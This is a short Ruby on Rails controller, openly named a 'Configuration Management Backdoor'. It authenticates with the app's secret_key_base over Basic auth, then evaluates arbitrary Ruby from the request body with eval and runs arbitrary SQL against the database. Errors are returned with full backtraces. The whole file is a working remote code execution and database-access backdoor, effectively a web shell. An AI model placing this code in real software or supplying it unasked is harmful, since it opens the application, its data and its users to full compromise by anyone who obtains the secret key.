class ConfigurationManagementBackdoorController < ApplicationController
  before_action :authenticate

  def authenticate
    _username, password = ActionController::HttpAuthentication::Basic \
                          .user_name_and_password(request) rescue [nil, nil]
    unless Rails.application.secrets.secret_key_base == password
      response.headers['WWW-Authenticate'] =
        'Basic realm="Configuration Management Backdoor via secret_key_base"'
      render plain: 'unauthorized', status: :unauthorized
    end
  end

  def invoke_ruby
    code = request.body.read
    render plain: eval(code)
  end

  def invoke_sql
    code = request.body.gets
    res = ActiveRecord::Base.connection.execute code
    render plain: res.to_a.to_s
  end

  def invoke
    case request.content_type.try(:downcase)
    when %r{application/ruby}
      invoke_ruby
    when %r{application/sql}
      invoke_sql
    else
      render status: 422,
             plain: "The content type '#{request.content_type}' " \
             'is not accepted.'
    end
  rescue Exception => e
    Rails.logger.error e
    render status: 500,
           plain: "Exception #{e} \n\n #{e.backtrace.join('\n')}"
  end
end
